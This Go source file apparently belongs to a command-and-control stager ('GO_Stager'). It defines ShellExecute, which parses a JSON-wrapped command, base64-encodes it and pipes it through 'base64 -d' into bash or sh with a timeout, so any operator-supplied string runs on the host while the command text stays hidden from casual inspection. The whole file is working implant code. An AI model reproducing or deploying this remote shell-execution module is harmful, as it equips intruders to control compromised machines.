package Command

import (
	"GO_Stager/util"
	"encoding/base64"
	"encoding/json"
	"os"
	"os/exec"
	"strings"
)

type Params struct {
	OptionName  string `json:"OptionName"`
	OptionValue string `json:"OptionValue"`
}

type CmdArgs struct {
	Params []Params `json:"Params"`
}

func ShellExecute(command string) (string, error) {
	sh_path := "/bin/bash"
	_, err := os.Stat(sh_path)
	if err != nil {
		sh_path = "/bin/sh"
	}
	var cmdArgs CmdArgs
	err = json.Unmarshal([]byte(strings.ReplaceAll(strings.ReplaceAll(command, `\"`, `"`), `\\`, `\`)), &cmdArgs)
	if err != nil {
		return "", err
	}
	cmdstr := cmdArgs.Params[0].OptionValue

	if strings.HasPrefix(cmdstr, "\"") {
		cmdstr = strings.TrimPrefix(cmdstr, "\"")
	}
	if strings.HasSuffix(cmdstr, "\"") {
		cmdstr = strings.TrimSuffix(cmdstr, "\"")
	}
	base64Cmd := base64.StdEncoding.EncodeToString([]byte(cmdstr))
	final_cmd := util.Sprintf("echo %s | timeout 5 base64 -d | timeout %d %s", base64Cmd, 5, sh_path)

	cmd := exec.Command(sh_path, "-c", final_cmd)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}
	return string(output), err
}
